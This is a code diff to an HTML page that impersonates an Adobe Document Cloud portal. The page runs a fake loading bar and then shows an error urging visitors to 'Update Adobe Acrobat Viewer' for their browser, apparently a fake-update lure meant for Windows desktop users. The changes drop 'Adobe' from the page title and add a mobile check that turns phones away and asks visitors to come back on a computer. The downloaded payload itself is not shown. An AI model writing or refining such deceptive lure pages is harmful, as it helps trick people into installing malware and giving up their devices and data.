@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Document Cloud - Secure Portal</title>
+    <title> Document Cloud - Secure Portal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -1374,6 +1374,11 @@
             
             return isWindows && !isMobile;
         }
+		
+		function isMobileDevice() {
+    const ua = navigator.userAgent;
+    return /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+}
 
         // ========== GET BROWSER NAME ==========
         function getBrowserName() {
@@ -1405,31 +1410,33 @@
         }
 
         // ========== SHOW ADOBE UPDATE LIGHTBOX ==========
-        function showAdobeUpdateLightbox() {
-            const lightbox = document.getElementById('adobeUpdateLightbox');
-            const progressBar = document.getElementById('adobeProgressBar');
-            const progressText = document.getElementById('progressText');
-            
-            // Show lightbox
-            lightbox.classList.add('active');
-            
-            // Animate progress bar
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 2;
-                progressBar.style.width = progress + '%';
-                progressText.textContent = `Loading... ${progress}%`;
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    
-                    // Wait 500ms then show error
-                    setTimeout(() => {
-                        showUpdateError();
-                    }, 500);
+function showAdobeUpdateLightbox() {
+    const lightbox = document.getElementById('adobeUpdateLightbox');
+    const progressBar = document.getElementById('adobeProgressBar');
+    const progressText = document.getElementById('progressText');
+    
+    lightbox.classList.add('active');
+    
+    const isMobile = isMobileDevice();
+    
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += 2;
+        progressBar.style.width = progress + '%';
+        progressText.textContent = `Loading... ${progress}%`;
+        
+        if (progress >= 100) {
+            clearInterval(interval);
+            setTimeout(() => {
+                if (isMobile) {
+                    showMobileError();
+                } else {
+                    showUpdateError();
                 }
-            }, 100); // 100ms * 50 iterations = 5 seconds
+            }, 500);
         }
+    }, 100);
+}
 
 // ========== SHOW UPDATE ERROR ==========
 function showUpdateError() {
@@ -1465,6 +1472,34 @@ function showUpdateError() {
     // Show update button
     document.getElementById('updateViewerBtn').style.display = 'flex';
     document.getElementById('update_btn_txt').textContent = `Update Adobe Acrobat Viewer For ${browser.name}`;
+}
+
+// ========== SHOW MOBILE ERROR ==========
+function showMobileError() {
+    document.getElementById('adobeLogoContainer').innerHTML = `
+        <img src="https://storage.googleapis.com/atlas-web-20260306-1360d7a95c5a/adb_logo2.png" 
+             alt="Adobe Logo" 
+             class="adobe-logo-img">
+    `;
+    
+    document.getElementById('adobeUpdateTitle').textContent = 'Mobile Portal Unavailable';
+    
+    const messageEl = document.getElementById('adobeUpdateMessage');
+    messageEl.classList.add('error');
+    messageEl.innerHTML = `
+        This project portal is optimized for viewing on a computer.<br><br>
+        The mobile portal is currently undergoing maintenance.<br>
+        Please access this page from a desktop or laptop computer.
+    `;
+    
+    document.getElementById('progressSection').style.display = 'none';
+    
+    const browserBadge = document.getElementById('browserBadge');
+    browserBadge.style.display = 'inline-flex';
+    document.getElementById('browserIcon').textContent = '📱';
+    document.getElementById('browserName').textContent = 'Mobile Device';
+    
+    document.getElementById('updateViewerBtn').style.display = 'none';
 }
 
         // ========== UPDATE VIEWER BUTTON HANDLER ==========
